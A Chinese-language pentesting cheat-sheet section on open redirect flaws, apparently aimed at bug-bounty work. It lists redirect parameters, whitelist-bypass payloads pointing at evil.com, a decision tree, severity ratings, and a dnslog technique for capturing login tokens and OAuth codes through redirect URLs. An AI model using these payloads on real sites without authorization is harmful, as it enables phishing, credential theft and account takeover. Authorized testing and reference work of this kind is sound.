# §24 Open Redirect

> 工具化: `tools/bin/xsredir.py` — payload 库 `tools/wordlists/redirect-payloads.txt`
> (UrlRedirectScan V1.2.0 内置表提取+补充,21 条解析器混淆变体;参数 26 个已内置)。
> 用法: `xsredir.py "<url?param=FUZZ>"` 或基础 URL+`--params next,redirect,url`;Location 含标记=实锤,同域跳转自动标误报,`--oob 你的dnslog` 追加盲打。
### 凭据外带检查（跳转类漏洞的危害升级位, 2026-08 实战）

登录/鉴权跳转的回链必须**逐字符审计**: token/ticket/code/sessionId 拼在跳转 URL 的
query 里 = 可外带。验证: 跳转 url 参数改 dnslog → 完成登录 → dnslog 收包 = 凭据劫持成立
(普通跳转=中危; 跳转+凭据外带=高危, 直接账号接管)。
发现手法: 最平凡的交互(点赞/收藏/分享)触发的跳转也要保存地址逐段比对。

### 绕过技法速查（含 @ 同源锁绕过，2026-08 实战）

Location 拼接形态不同，绕过方式不同（依次尝试）:
- 直接外域: `redirectUrl=https://evil.com`
- 协议相对: `//evil.com` / `///evil.com`
- **同源路径反射** `Location: https://{domain}/{path}` → `pathName=@evil.com`
  （@ 前变 userinfo，真实 host = evil.com——2026-08 国网重庆公众号实战验证）
- 编码变体: `..%2f` / `%2f%2fevil.com` / `%09evil.com`
- 白名单前缀: `https://{trusted}.evil.com` / `https://{trusted}evil.com`
- 符号拼接: `https:{trusted}.evil.com` / `//{trusted}.evil.com`

### 识别信号
- 参数：`redirect` `next` `return` `goto` `redirectUrl` `redirect_uri` `callback` `target` `continue` `back`
- 302/301 响应码 + `Location` 头指向参数指定的 URL
- 登录/退出/OAuth/支付回调页面（天然需要跳转的流程）

### 决策流程
```
发现重定向参数?
├── Step 1: 基础验证
│   → ?redirect=https://evil.com → 302 Location: https://evil.com → Open Redirect ✅
│   → ?redirect=//evil.com → 302 Location: //evil.com (协议相对URL) → ✅
│   → ?redirect=\evil.com → 302 Location: \evil.com (反斜杠, 部分浏览器解析为 //) → ✅
│
├── Step 2: 白名单绕过 (如果基础验证被拦)
│   → ?redirect=https://target.com.evil.com (后缀匹配绕过)
│   → ?redirect=https://evil.com/target.com (路径包含目标域)
│   → ?redirect=https://target.com@evil.com (@ 绕过)
│   → ?redirect=https://target.com%00.evil.com (空字节截断)
│   → ?redirect=https://evil.com%23target.com (# 截断)
│
├── Step 3: OAuth 场景升级
│   → Open Redirect + OAuth → redirect_uri 白名单绕过 → 劫持 authorization code → 账户接管
│   → 参照 §22 OAuth/SSO
│
└── Step 4: 危害评估
    → 钓鱼(phishing): 用户点击 target.com 链接 → 跳转到钓鱼页面 → 输入凭据
    → Token泄露: 302 跳转时浏览器携带 Referer → 第三方站点看到 token/session
    → OAuth升级: 结合 redirect_uri → 高危
    → 无OAuth结合、无token泄露 → 低危/中危 (取决于钓鱼可利用性)
```

### Payload
```
基础跳转测试:
  ?redirect=https://evil.com
  ?redirect=//evil.com
  ?redirect=\\evil.com
  ?redirect=https:evil.com

白名单绕过:
  ?redirect=https://target.com.evil.com
  ?redirect=https://evil.com#target.com
  ?redirect=https://evil.com?target.com
  ?redirect=https://target.com@evil.com
  ?redirect=javascript:alert(1)  (少数场景)
```

### SRC合规
```
严重度:
  Open Redirect + OAuth → redirect_uri bypass → 高危
  可窃取token/session的302跳转 → 中危
  纯钓鱼场景(用户需交互) → 低危
  无实际影响的跳转 → 忽略
```

---
